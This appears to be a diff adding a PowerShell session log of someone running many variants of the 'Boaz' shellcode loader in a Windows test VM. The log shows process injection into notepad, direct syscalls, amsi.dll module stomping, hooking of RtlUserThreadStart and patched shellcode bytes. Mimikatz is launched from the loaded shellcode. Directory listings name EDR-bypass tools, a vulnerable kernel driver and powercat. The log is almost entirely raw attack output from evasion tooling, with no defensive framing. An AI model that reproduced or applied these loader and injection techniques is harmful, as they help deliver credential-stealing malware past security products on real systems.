@@ -1,0 +1,1036 @@
+PS Z:\VMshare\Virus\boaz_output> .\boaz_mi_l74_rc4_aes.exe
+[+] size of magiccode: 1357184 bytes
+[+] Starting Boaz custom loader...
+[+] Ntdll base address found: 00007ffb55930000
+[+] Located RtlUserThreadStart @ 00007ffb55982630
+[+] OS Version: Major 10, Minor 0, Build 19044
+[+] Detected Windows 10
+[+] Windows 10 detected, use mov r9, rcx
+[+] Found pattern @ 0x00007ffb55982634
+[+] Relative address is: 00000000001179b2
+[+] VT pointer is: 00007ffb55a99ff0
+[+] pointer value is: 00007ffb53dd7020
+[+] Before Patching:
+51 52 41 50 41 51 41 52 41 53 48 B8 88 77 66 55
+44 33 22 11 48 BB 22 33 44 55 66 77 88 99 48 8B
+0B 48 89 03 50 48 BA EF BE AD DE 00 00 00 00 49
+C7 C0 20 00 00 00 4C 8D 4B 16 48 83 EC 40 48 B8
+41 41 41 41 41 41 41 41 FF D0 48 83 C4 40 48 83
+EC 40 E8 11 00 00 00 48 83 C4 40 58 41 5B 41 5A
+41 59 41 58 5A 59 FF E0
+[+] After Patching:
+51 52 41 50 41 51 41 52 41 53 48 B8 20 70 DD 53
+FB 7F 00 00 48 BB F0 9F A9 55 FB 7F 00 00 48 8B
+0B 48 89 03 50 48 BA E8 B5 14 00 00 00 00 00 49
+C7 C0 20 00 00 00 4C 8D 4B 16 48 83 EC 40 48 B8
+70 BC DD 53 FB 7F 00 00 FF D0 48 83 C4 40 48 83
+EC 40 E8 11 00 00 00 48 83 C4 40 58 41 5B 41 5A
+41 59 41 58 5A 59 FF E0
+[+] Patched Values:
+[+] originalVtPtrValue: 0x00007FFB53DD7020
+[+] pHookAddr: 0x00007FFB55A99FF0
+[+] magiccodeSize: 0x000000000014B5E8
+[+] pVirtualProtect: 0x00007FFB53DDBC70
+[+] Combined Shellcode Size: 1357288 bytes
+[+] Using NtCreateThreadEx for APC write. thread calling function.
+[+] Transaction Mode: Disabled
+[+] APIs resolved by hash successfully.
+[+] LoadLibrary at: 00007ffb53ddfee0
+ by stealth module loading[-] No custom DLL specified. Falling back to amsi.dll.
+[+] Using DLL: C:\windows\system32\amsi.dll
+[+] TxF Mode: Disabled
+[+] NON-MICROSOFT SIGNED DLLs BLOCKED SUCCESSFULLY.
+[*] bRemoteInjection is FALSE. Opening current process.
+[+] hProcess: ffffffffffffffff
+[+] Process ID: 3520
+[+] DLL file opened successfully.
+[+] Using mapped DLL with missing PEB (NtCreateSection and NtMapViewOfSection).
+[+] Section mapped successfully.
+[+] fileBase: 00007ffb443c0000
+[+] viewSize: 102400
+[!] Before add our module to the PEB lists.
+[!] press any key to continue
+
+[!] press any key to continue
+
+[+] DOS header: 00007ffb443c0000
+[+] Entry point RVA: 0000000000009940
+[+] DLL size: 102400
+[+] Remote DLL entry point: 00007ffb443c9940
+[+] Default memory protection in target DLL is: PAGE_EXECUTE_READ
+[+] WriteProcessMemory success.
+[+] Bytes written: 9920
+[+] Magic code written with APC write.
+[+] press any key to continue
+
+[-] NtProtectVirtualMemory failed to restore original memory protection. Status: c0000018
+[+] Original memory protection was: PAGE_NOACCESS (0x00000001)
+[!] Installing local hook...
+
+[+] pHookAddr is: 00007ffb55a99ff0
+[+] *(DWORD_PTR*)pHookAddr is pointed to: 00007ffb53dd7020
+[+] originalVtPtrValue is: 00007ffb53dd7020
+[+] memory scan now.
+
+[+] memory scan now. The VT Ptr has been replaced.
+
+[+] *(DWORD_PTR*)pHookAddr is now pointed to: 00007ff72b406024
+Waiting... Press Enter to signal event.
+
+[^_^] VMT hooked pointer called.
+[-_-] press any key to continue
+
+PS Z:\VMshare\Virus\boaz_output> .\boaz_mi_l74_rc4_aes.exe
+[+] size of magiccode: 1357184 bytes
+[+] Starting Boaz custom loader...
+[+] Ntdll base address found: 00007ffb55930000
+[+] Located RtlUserThreadStart @ 00007ffb55982630
+[+] OS Version: Major 10, Minor 0, Build 19044
+[+] Detected Windows 10
+[+] Windows 10 detected, use mov r9, rcx
+[+] Found pattern @ 0x00007ffb55982634
+[+] Relative address is: 00000000001179b2
+[+] VT pointer is: 00007ffb55a99ff0
+[+] pointer value is: 00007ffb53dd7020
+[+] Before Patching:
+51 52 41 50 41 51 41 52 41 53 48 B8 88 77 66 55
+44 33 22 11 48 BB 22 33 44 55 66 77 88 99 48 8B
+0B 48 89 03 50 48 BA EF BE AD DE 00 00 00 00 49
+C7 C0 20 00 00 00 4C 8D 4B 16 48 83 EC 40 48 B8
+41 41 41 41 41 41 41 41 FF D0 48 83 C4 40 48 83
+EC 40 E8 11 00 00 00 48 83 C4 40 58 41 5B 41 5A
+41 59 41 58 5A 59 FF E0
+[+] After Patching:
+51 52 41 50 41 51 41 52 41 53 48 B8 20 70 DD 53
+FB 7F 00 00 48 BB F0 9F A9 55 FB 7F 00 00 48 8B
+0B 48 89 03 50 48 BA E8 B5 14 00 00 00 00 00 49
+C7 C0 20 00 00 00 4C 8D 4B 16 48 83 EC 40 48 B8
+70 BC DD 53 FB 7F 00 00 FF D0 48 83 C4 40 48 83
+EC 40 E8 11 00 00 00 48 83 C4 40 58 41 5B 41 5A
+41 59 41 58 5A 59 FF E0
+[+] Patched Values:
+[+] originalVtPtrValue: 0x00007FFB53DD7020
+[+] pHookAddr: 0x00007FFB55A99FF0
+[+] magiccodeSize: 0x000000000014B5E8
+[+] pVirtualProtect: 0x00007FFB53DDBC70
+[+] Combined Shellcode Size: 1357288 bytes
+[+] Using NtCreateThreadEx for APC write. thread calling function.
+[+] Transaction Mode: Disabled
+[+] APIs resolved by hash successfully.
+[+] LoadLibrary at: 00007ffb53ddfee0
+ by stealth module loading[-] No custom DLL specified. Falling back to amsi.dll.
+[+] Using DLL: C:\windows\system32\amsi.dll
+[+] TxF Mode: Disabled
+[+] NON-MICROSOFT SIGNED DLLs BLOCKED SUCCESSFULLY.
+[*] bRemoteInjection is FALSE. Opening current process.
+[+] hProcess: ffffffffffffffff
+[+] Process ID: 8768
+[+] DLL file opened successfully.
+[+] Using mapped DLL with missing PEB (NtCreateSection and NtMapViewOfSection).
+[+] Section mapped successfully.
+[+] fileBase: 00007ffb443c0000
+[+] viewSize: 102400
+[!] Before add our module to the PEB lists.
+[!] press any key to continue
+
+[!] press any key to continue
+
+[+] DOS header: 00007ffb443c0000
+[+] Entry point RVA: 0000000000009940
+[+] DLL size: 102400
+[+] Remote DLL entry point: 00007ffb443c9940
+[+] Default memory protection in target DLL is: PAGE_EXECUTE_READ
+[+] WriteProcessMemory success.
+[+] Bytes written: 9920
+[+] Magic code written with APC write.
+[+] press any key to continue
+
+[-] NtProtectVirtualMemory failed to restore original memory protection. Status: c0000018
+[+] Original memory protection was: PAGE_NOACCESS (0x00000001)
+[!] Installing local hook...
+
+[+] pHookAddr is: 00007ffb55a99ff0
+[+] *(DWORD_PTR*)pHookAddr is pointed to: 00007ffb53dd7020
+[+] originalVtPtrValue is: 00007ffb53dd7020
+[+] memory scan now.
+
+[+] memory scan now. The VT Ptr has been replaced.
+
+[+] *(DWORD_PTR*)pHookAddr is now pointed to: 00007ff6660e6024
+Waiting... Press Enter to signal event.
+
+[^_^] VMT hooked pointer called.
+[-_-] press any key to continue
+
+PS Z:\VMshare\Virus\boaz_output> cd ..
+PS Z:\VMshare\Virus> ls
+
+
+    Directory: Z:\VMshare\Virus
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----        12/21/2025  10:54 PM                boaz_output
+------        10/20/2025  10:24 PM        3110400 go-mimikatz-wrapper.exe
+------        10/20/2025  10:24 PM        4785664 go-directsyscall-wrapper.exe
+------         11/2/2025   2:18 AM          72192 crazydog.exe
+------         11/2/2025   3:49 AM        1819648 crazydog-go-wrapper.exe
+------        12/17/2025   8:54 PM        4896279 boaz_mi_1_easy.exe
+------         11/2/2025   7:09 PM          14024 RTCore64.sys
+------         11/1/2025   9:28 PM          92752 crazydog.ps1
+------        10/20/2025  10:24 PM        4937728 go-quickbuck-wrapper.exe
+------         11/1/2025   5:43 AM          37667 powercat.ps1
+------        10/22/2025   6:57 AM        3243008 FlexEngine.exe
+
+
+PS Z:\VMshare\Virus> cd ..
+PS Z:\VMshare> ls
+
+
+    Directory: Z:\VMshare
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----        10/28/2025   3:27 AM                GetInfo
+d-----         11/2/2025   2:29 AM                Anti
+d-----        12/21/2025   8:47 PM                Virus
+d-----        10/20/2025   4:35 AM                winser2012
+d-----        10/31/2025  12:24 AM                EDRBypass
+d-----        10/27/2025  10:15 PM                Drivers
+d-----        10/28/2025   3:44 AM                rubbish
+d-----        10/20/2025  11:47 PM                kerneldbg
+d-----        10/20/2025  11:51 PM                winser2022
+------        12/18/2025   2:37 AM       67867136 frida-server-17.5.2-windows-x86_64.exe
+------         1/27/2025  11:31 AM           7614 set_ntp_.log
+------         1/30/2025  11:18 PM           1030 debug_survey_driver.txt
+------        12/14/2025  12:19 AM        1896237 Everything-1.4.1.1030.x64.zip
+------        12/18/2025   2:37 AM       67863552 frida-portal-17.5.2-windows-x86_64.exe
+------        12/11/2025  12:53 AM          14482 set_ntp.ps1
+
+
+PS Z:\VMshare> cd .\Virus\boaz_output\
+PS Z:\VMshare\Virus\boaz_output> .\16_boaz_mi.exe
+Program '16_boaz_mi.exe' failed to run: Access is deniedAt line:1 char:1
++ .\16_boaz_mi.exe
++ ~~~~~~~~~~~~~~~~.
+At line:1 char:1
++ .\16_boaz_mi.exe
++ ~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
+    + FullyQualifiedErrorId : NativeCommandFailed
+
+PS Z:\VMshare\Virus\boaz_output> ls
+
+
+    Directory: Z:\VMshare\Virus\boaz_output
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+------        12/21/2025  10:13 PM        1864738 boaz_mi_l61_aes.exe
+------        12/21/2025   9:15 PM        4986776 boaz_mi_advanced.exe
+------        12/21/2025  10:54 PM        2013769 boaz_mi_l74_rc4_aes.exe
+------        12/21/2025   8:46 PM        4997652 boaz_mi_advanced_37.exe
+------        12/21/2025   9:09 PM        4997652 boaz_mi_advanced_37_1.exe
+------        12/22/2025  12:07 AM        1650172 16_boaz_mi.exe
+------        12/21/2025  10:26 PM        2013609 boaz_mi_l73_aes.exe
+
+
+PS Z:\VMshare\Virus\boaz_output> .\16_boaz_mi.exe
+Program '16_boaz_mi.exe' failed to run: Access is deniedAt line:1 char:1
++ .\16_boaz_mi.exe
++ ~~~~~~~~~~~~~~~~.
+At line:1 char:1
++ .\16_boaz_mi.exe
++ ~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
+    + FullyQualifiedErrorId : NativeCommandFailed
+
+PS Z:\VMshare\Virus\boaz_output> .\1_boaz_mi.exe
+[+] size of magiccode: 1386464 bytes
+←[32m[+] Using default magiccode with size: 1386464 bytes←[0m
+First 8 bytes: e8 c0 c5 14 00 c0 c5 14
+Last 8 bytes: e8 c0 c5 14 00 c0 c5 14
+[+] Searching for syscall #1 in NtAllocateVirtualMemory @ 00007ffb559cd060
+[+] Found syscall #1 for NtAllocateVirtualMemory at 00007ffb559cd072
+[+] Found syscall number: 24
+[+] press enter to allocate memory
+
+[+] Allocated size: 1386464
+[+] MagicCode size: 8
+[+] allocatedAddress: 00000176a3840000
+[+] Searching for syscall #1 in NtWriteVirtualMemory @ 00007ffb559cd4a0
+[+] Found syscall #1 for NtWriteVirtualMemory at 00007ffb559cd4b2
+[+] Memory written
+[+] Memory changed to PAGE_EXECUTE_READWRITE
+[+] RtlUserThreadStart executed.
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # ^D
+PS Z:\VMshare\Virus\boaz_output> .\2_boaz_mi.exe
+[+] size of magiccode: 1386464 bytes
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz #
+mimikatz #
+PS Z:\VMshare\Virus\boaz_output> .\3_boaz_mi.exe
+[+] size of magiccode: 1386464 bytes
+ [+] Enable SeDebugPrivilege adequate privilege
+ [+] Success
+Usage: Z:\VMshare\Virus\boaz_output\3_boaz_mi.exe -pid <PID> -step <1|2|3> -buffer <address>
+ if no argument supplied, run in default mode
+Running with default notepad due to insufficient parameters.
+Notepad started with default settings.
+[*]target process PID: 8352
+[+] Memory address of the default loaded ntdll.dll: 00007ffb55930000
+[+] Memory location of loaded ntdll.dll: 000001ee15ead040
+[+] .rdata section found.
+[+] Address of NtOpenProcess in manual loaded ntdll export table: 000001ee15f49660
+[+] Syscall stub for NtOpenProcess found.
+[+] Syscall stub bytes: 4C 8B D1 B8 26 00 00 00 F6 04 25 08 03 FE 7F 01 75 03 0F 05 C3 CD 2E
+[+] Memory location of NtOpenProcess syscall stub outwith EAT: 000000abd0bff3d0
+[+] NtOpenProcess succeeded.
+[+] Process handle: 134
+[+] Memory location of NtOpenProcess syscall stub: 000000abd0bff3d0
+[*] old protection: 64
+[+] Address of NtAllocateVirtualMemory in manual loaded ntdll export table: 000001ee15f494a0
+[+] Syscall stub for NtAllocateVirtualMemory found.
+[+] Syscall stub bytes: 4C 8B D1 B8 18 00 00 00 F6 04 25 08 03 FE 7F 01 75 03 0F 05 C3 CD 2E
+[+] Memory location of NtAllocateVirtualMemory syscall stub outwith EAT: 000000abd0bff3d0
+[+] NtAllocateVirtualMemory succeeded.
+[+] Process handle: 134
+[*] old protection: 64
+[*]Hash of WriteProcessMemory: 0xfc96413b
+[*] function name:WriteProcessMemory hash: 0xfc96413b RVA: 00007ffb53dfcc80
+[+]Successfully wrote magiccode to the allocated memory.
+[+] Address of NtCreateThreadEx in manual loaded ntdll export table: 000001ee15f4a9b0
+[+] Syscall stub for NtCreateThreadEx found.
+[+] Syscall stub bytes: 4C 8B D1 B8 C1 00 00 00 F6 04 25 08 03 FE 7F 01 75 03 0F 05 C3 CD 2E
+[+] Memory location of NtCreateThreadEx syscall stub outwith EAT: 000000abd0bff3d0
+[+] NtCreateThreadEx succeeded.
+[+] Process handle: 134
+PS Z:\VMshare\Virus\boaz_output> ^C
+PS Z:\VMshare\Virus\boaz_output> ^C
+PS Z:\VMshare\Virus\boaz_output> LS
+
+
+    Directory: Z:\VMshare\Virus\boaz_output
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+------        12/22/2025  12:11 AM        1705391 6_boaz_mi.exe
+------        12/22/2025  12:11 AM        1643556 14_boaz_mi.exe
+------        12/22/2025  12:12 AM        1824873 23_boaz_mi.exe
+------        12/21/2025  10:13 PM        1864738 boaz_mi_l61_aes.exe
+------        12/22/2025  12:11 AM        1940950 4_boaz_mi.exe
+------        12/22/2025  12:11 AM        1517056 15_boaz_mi.exe
+------        12/22/2025  12:12 AM        1823848 21_boaz_mi.exe
+------        12/21/2025   9:15 PM        4986776 boaz_mi_advanced.exe
+------        12/21/2025  10:54 PM        2013769 boaz_mi_l74_rc4_aes.exe
+------        12/21/2025   8:46 PM        4997652 boaz_mi_advanced_37.exe
+------        12/22/2025  12:11 AM        1644188 7_boaz_mi.exe
+------        12/22/2025  12:12 AM        1827440 25_boaz_mi.exe
+------        12/22/2025  12:11 AM        2003341 5_boaz_mi.exe
+------        12/22/2025  12:12 AM        1652775 20_boaz_mi.exe
+------        12/22/2025  12:11 AM        1890013 10_boaz_mi.exe
+------        12/21/2025   9:09 PM        4997652 boaz_mi_advanced_37_1.exe
+------        12/22/2025  12:11 AM        1650172 16_boaz_mi.exe
+------        12/22/2025  12:11 AM        1646812 9_boaz_mi.exe
+------        12/21/2025  10:26 PM        2013609 boaz_mi_l73_aes.exe
+------        12/22/2025  12:12 AM        1704630 18_boaz_mi.exe
+------        12/22/2025  12:10 AM        1774606 1_boaz_mi.exe
+------        12/22/2025  12:10 AM        1645906 2_boaz_mi.exe
+------        12/22/2025  12:12 AM        1650272 24_boaz_mi.exe
+
+
+PS Z:\VMshare\Virus\boaz_output> .\4_boaz_mi.exe
+[+] size of magiccode: 1386464 bytes
+14c5c0e8-c000-14c5-0078-c995ba70dddd
+ab03ac3d-e2c8-1653-1343-6821bea494e9
+2109c3aa-ddd7-0535-4f00-000000228f43
+23c4fdde-9ee6-3628-3e51-7baddaed3f56
+f09bfaae-4554-9a2f-e7ff-e2686f98a260
+eccd7d61-e633-7788-ddbb-8562a2b4fbbd
+3cdca96b-4011-7d88-74b2-d8c2af4ae70e
+8eb6c762-da12-6014-f62a-360a46db5cc5
+fdc7d8aa-9c5f-ad52-6e8e-adb0ad717f8f
+f86b4d61-aeec-4a91-43e9-7936bc84f9a3
+b2886647-9dc3-9241-687f-e9559c8a594d
+f7b22bf4-ce8e-b25b-12ed-927783ad852b
+50f726c6-4dcb-86fd-2dac-fbac7be033eb
+70c4bed1-3d80-0ee4-04af-295383efef0e
+2da1de55-99a0-b85b-a9e5-71f4309aa627
+8150bc7e-bbb4-3901-a878-e6e37aaa948e
+d835efcd-d6de-c594-9b5e-67bedf288ab9
+858aa487-6fb1-eca9-98ed-325f75a9a54d
+8d4a84fb-4007-ab46-8dc0-9718d6199689
+a73354e8-c56e-ad72-fc0c-b6e83137f4be
+5ec874fc-1ac2-13bd-c736-12e21f5adcf1
+25c9dc93-2541-7bdd-b45a-6b413f9773a4
+0838de46-99fa-2f3c-27b1-949d582f876c
+debb58f2-74fa-c30d-7ca8-2ff7d0690d59
+96221ffb-d4da-70b9-3bf6-d60ea8891ef9
+4df71122-43ab-9b30-2c6d-f4066931d5ed
+e3d71623-f7cc-4f39-321a-0b7089246361
+23023148-44b7-7e25-b074-ffca196228df
+5ed3192d-1c83-9292-f95b-555e8915acc2
+1188a1e0-6084-8aeb-09a4-ceda4eb0e9c6
+f978eb7a-9a50-5163-9be0-a76f1e029a72
+37ebc814-fd0a-0b82-0db6-a660dd44ec1a
+f6530e26-1e3c-d66a-7aad-f355a1f63879
+aebfdd93-0a6e-63f9-1ee3-fe672e172d83
+7ee7b49a-b525-0759-12de-d18053000000
+00000000-0100-0000-0003-000000000000
+44c5de00-57a4-aa4a-d01a-f7a63317717c
+aa06c303-3334-d2d5-355f-ffc047d98765
+3d3b51e9-23b1-cb0a-1651-45f504d7e76e
+42b2e93c-8f0f-ac3b-67c5-0c552209a4d1
+4ae8b2eb-a127-cd57-0ecf-8e1f0e92f7b0
+ffe88349-67b5-30b4-68e1-be6b082cba31
+094e5c6b-bfc7-20b7-1950-b8796ee5565b
+efa282bc-8f07-4f24-d8ab-de214600e41d
+71a5c543-f2cc-4aec-00e2-9418ee1a8e52
+1a63ad62-8510-f883-6495-30588ac84029
+ee338440-9300-739c-fb1c-1350fe4a3e51
+538563e9-67ad-d4f9-4ed0-2a9324d4415b
+7051ba8c-b034-b055-5c20-93855b033dd5
+3dcddfee-7ad9-d1a0-493c-a938f6338c44
+ee1110cb-bda3-3c63-1ca6-e5bda5299f80
+21e37286-6195-baec-6215-432bc9f0a1e7
+bd858e4b-0f43-8c9f-f391-7e172c287eac
+646d7503-fec0-6763-4c62-714a0e674182
+052f5f3c-5161-929b-0acc-dc7c31c98ff0
+1fe0d59e-55d9-d8eb-0b43-bad9b154e198
+7698811f-1110-3276-a819-92eb3b976695
+5c85821a-8907-f402-1d0d-1cbac92315b9
+7b5a1beb-db46-b0b0-f0dd-aef94e852b19
+648d4a16-7e8e-ad6c-3aac-bf4f423bdf08
+5c305451-3dd9-6f37-8937-bb087e821c0c
+575e3180-fbeb-4d9d-343c-065ec5c429fc
+bf6b058b-8d52-88d1-cc50-94d85295ddf7
+6ca9931e-7dab-64f6-0811-c287a2ed50c3
+56f8f2fa-6676-824f-db52-e4a1b2ec4d94
+46e
+PS Z:\VMshare\Virus\boaz_output> .\5_boaz_mi.exe
+[+] size of magiccode: 1386464 bytes
+[+] Starting program...
+[-] Usage: Z:\VMshare\Virus\boaz_output\5_boaz_mi.exe <PID or Process Name>
+PS Z:\VMshare\Virus\boaz_output> .\5_boaz_mi.exe notepad.exe
+[+] size of magiccode: 1386464 bytes
+[+] Starting program...
+[+] magiccode prepared...
+[+] Process opened...
+[+] Memory allocated in remote process...
+[+] DLL path written to remote process memory...
+[+] Got address of LoadLibraryW...
+[+] Remote thread created to load DLL...
+[+] Waited for remote thread...
+[+] Modules enumerated...
+[+] Found amsi.dll at 00007ffb443c0000
+[+] Heap memory allocated for reading DLL headers...
+[+] Read remote process memory for DLL headers...
+[+] Calculated DLL entry point address: 00007ffb443c9940
+[+] magiccode written to DLL's entry point...
+[+] Remote thread created for executing magiccode...
+[+] Operation completed. Exiting program...
+PS Z:\VMshare\Virus\boaz_output> .\6_boaz_mi.exe
+[+] size of magiccode: 1386464 bytes
+ [+] Enable SeDebugPrivilege adequate privilege
+ [+] Success
+Usage: Z:\VMshare\Virus\boaz_output\6_boaz_mi.exe <PID>
+[*] system is 64 bit
+[*] notepad path: C:\Windows\System32\notepad.exe
+[*] target process PID: 6776
+[+] Opened process 6776.
+[+] Allocated memory in target process.
+[+] Wrote magiccode to target process memory.
+[+] Created snapshot of all threads in the system.
+[+] Opened thread 7500 of target process.
+[+] Suspended selected thread.
+[+] Set new thread context.
+[+] Resumed selected thread.
+PS Z:\VMshare\Virus\boaz_output> .\7_boaz_mi.exe
+[+] size of magiccode: 1386464 bytes
+Starting program...
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # ^D
+mimikat
+PS Z:\VMshare\Virus\boaz_output> ls
+
+
+    Directory: Z:\VMshare\Virus\boaz_output
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+------        12/22/2025  12:14 AM        1645428 47_boaz_mi.exe
+------        12/22/2025  12:11 AM        1643556 14_boaz_mi.exe
+------        12/22/2025  12:12 AM        1647277 29_boaz_mi.exe
+------        12/22/2025  12:12 AM        1824873 23_boaz_mi.exe
+------        12/22/2025  12:13 AM        1654653 34_boaz_mi.exe
+------        12/21/2025  10:13 PM        1864738 boaz_mi_l61_aes.exe
+------        12/22/2025  12:13 AM        1848951 37_boaz_mi.exe
+------        12/22/2025  12:11 AM        1940950 4_boaz_mi.exe
+------        12/22/2025  12:13 AM        1647269 30_boaz_mi.exe
+------        12/22/2025  12:11 AM        1517056 15_boaz_mi.exe
+------        12/22/2025  12:12 AM        1823848 21_boaz_mi.exe
+------        12/21/2025   9:15 PM        4986776 boaz_mi_advanced.exe
+------        12/21/2025  10:54 PM        2013769 boaz_mi_l74_rc4_aes.exe
+------        12/21/2025   8:46 PM        4997652 boaz_mi_advanced_37.exe
+------        12/22/2025  12:11 AM        1644188 7_boaz_mi.exe
+------        12/22/2025  12:12 AM        1827440 25_boaz_mi.exe
+------        12/22/2025  12:12 AM        1652775 20_boaz_mi.exe
+------        12/22/2025  12:13 AM        1657509 36_boaz_mi.exe
+------        12/22/2025  12:11 AM        1890013 10_boaz_mi.exe
+------        12/21/2025   9:09 PM        4997652 boaz_mi_advanced_37_1.exe
+------        12/22/2025  12:11 AM        1650172 16_boaz_mi.exe
+------        12/22/2025  12:11 AM        1646812 9_boaz_mi.exe
+------        12/21/2025  10:26 PM        2013609 boaz_mi_l73_aes.exe
+------        12/22/2025  12:12 AM        1704630 18_boaz_mi.exe
+------        12/22/2025  12:10 AM        1774606 1_boaz_mi.exe
+------        12/22/2025  12:15 AM        1864738 61_boaz_mi.exe
+------        12/22/2025  12:12 AM        1949014 28_boaz_mi.exe
+------        12/22/2025  12:10 AM        1645906 2_boaz_mi.exe
+------        12/22/2025  12:12 AM        1830690 26_boaz_mi.exe
+------        12/22/2025  12:13 AM        1940463 31_boaz_mi.exe
+------        12/22/2025  12:12 AM        1650272 24_boaz_mi.exe
+
+
+PS Z:\VMshare\Virus\boaz_output> .\9_boaz_mi.exe
+[+] size of magiccode: 1386464 bytes
+Starting program...
+[+] Code written.
+PS Z:\VMshare\Virus\boaz_output> .\10_boaz_mi.exe
+[+] size of magiccode: 1386464 bytes
+[+] Memory address of the default loaded ntdll.dll: 00007ffb55930000
+ [+] Enable SeDebugPrivilege adequate privilege
+ [+] Success
+Usage: Z:\VMshare\Virus\boaz_output\10_boaz_mi.exe -pid <PID> -step <1|2|3> -buffer <address>
+ if no argument supplied, run in default mode
+Running with default notepad due to insufficient parameters.
+Notepad started with default settings.
+[*]target process PID: 7060
+[+] Memory location of loaded ntdll.dll: 000001a07a25f040
+[+] .rdata section found.
+[+] Address of NtOpenProcess in manual loaded ntdll export table: 000001a07a2fb660 with hash: 0x3844decd
+[+] Syscall stub for NtOpenProcess found.
+[+] Syscall stub bytes: 4C 8B D1 B8 26 00 00 00 F6 04 25 08 03 FE 7F 01 75 03 0F 05 C3 CD 2E
+[+] Memory location of NtOpenProcess syscall stub outwith EAT: 0000009d5a1ff4d0
+[+] NtOpenProcess succeeded.
+[+] Address of NtAllocateVirtualMemory in manual loaded ntdll export table: 000001a07a2fb4a0 with hash: 0xc2a61fe7
+[+] Syscall stub for NtAllocateVirtualMemory found.
+[+] Syscall stub bytes: 4C 8B D1 B8 18 00 00 00 F6 04 25 08 03 FE 7F 01 75 03 0F 05 C3 CD 2E
+[+] Memory location of NtAllocateVirtualMemory syscall stub outwith EAT: 0000009d5a1ff4d0
+[+] NtAllocateVirtualMemory succeeded.
+[+] Process handle: 188
+[+] Address of NtWriteVirtualMemory in manual loaded ntdll export table: 000001a07a2fb8e0 with hash: 0xd22b25ad
+[+] Syscall stub for NtWriteVirtualMemory found.
+[+] Syscall stub bytes: 4C 8B D1 B8 3A 00 00 00 F6 04 25 08 03 FE 7F 01 75 03 0F 05 C3 CD 2E
+[+] Memory location of NtWriteVirtualMemory syscall stub outwith EAT: 0000009d5a1ff4d0
+[+] NtWriteVirtualMemory succeeded.
+[+] Process handle: 188
+[+] Address of NtProtectVirtualMemory in manual loaded ntdll export table: 000001a07a2fbba0 with hash: 0x1b792aef
+[+] Syscall stub for NtProtectVirtualMemory found.
+[+] Syscall stub bytes: 4C 8B D1 B8 50 00 00 00 F6 04 25 08 03 FE 7F 01 75 03 0F 05 C3 CD 2E
+[+] Memory location of NtProtectVirtualMemory syscall stub outwith EAT: 0000009d5a1ff4d0
+[+] NtProtectVirtualMemory succeeded. Old protection was: PAGE_READWRITE
+[+] Address of NtCreateThreadEx in manual loaded ntdll export table: 000001a07a2fc9b0 with hash: 0x84af83d5
+[+] Syscall stub for NtCreateThreadEx found.
+[+] Syscall stub bytes: 4C 8B D1 B8 C1 00 00 00 F6 04 25 08 03 FE 7F 01 75 03 0F 05 C3 CD 2E
+[+] Memory location of NtCreateThreadEx syscall stub outwith EAT: 0000009d5a1ff4d0
+[+] NtCreateThreadEx succeeded.
+[+] Process handle: 188
+PS Z:\VMshare\Virus\boaz_output> .\14_boaz_mi.exe
+[+] size of magiccode: 1386464 bytes
+Good morning!
+PS Z:\VMshare\Virus\boaz_output> .\15_boaz_mi.exe
+[+] size of magiccode: 1386464 bytes
+[-] PID not provided or invalid, launching default process
+Notepad started with default settings.
+[+] notepad PID: 8044
+[32m[+] Using default magiccode with size: 1386464 bytes[0m
+[+] Classic execution starts, I will be whispering in your ears 2
+{+] press any key to continue...
+PS Z:\VMshare\Virus\boaz_output> .\16_boaz_mi.exe
+Program '16_boaz_mi.exe' failed to run: Access is deniedAt line:1 char:1
++ .\16_boaz_mi.exe
++ ~~~~~~~~~~~~~~~~.
+At line:1 char:1
++ .\16_boaz_mi.exe
++ ~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
+    + FullyQualifiedErrorId : NativeCommandFailed
+
+PS Z:\VMshare\Virus\boaz_output> .\18_boaz_mi.exe
+[+] size of magiccode: 1386464 bytes
+ [+] Success
+[+] Remote process ID: 8624
+[+] Classic execution with APC starts, I will be whispering in your ears
+Writing byte 0xE8 to address 0000028ec5940000
+Writing byte 0x0B to address 0000028ec5a927df
+PS Z:\VMshare\Virus\boaz_output> .\20_boaz_mi.exe
+[+] size of magiccode: 1386464 bytes
+Starting program...
+[+] Transaction Mode: Disabled
+[+] DLL file opened successfully.
+[+] DLL loaded.
+[+] DLL entry point: 0000029dd2ae9940
+[+] Default memory protection before change in target DLL is: PAGE_EXECUTE_READ
+VirtualProtectEx failed to change memory protection. Error: 487
+PS Z:\VMshare\Virus\boaz_output> .\21_boaz_mi.exe
+[+] size of magiccode: 1386464 bytes
+Starting program...
+[+] Transaction Mode: Disabled
+[-] No custom DLL specified. Falling back to amsi.dll.
+[+] Using DLL: C:\windows\system32\amsi.dll
+[+] TxF Mode: Disabled
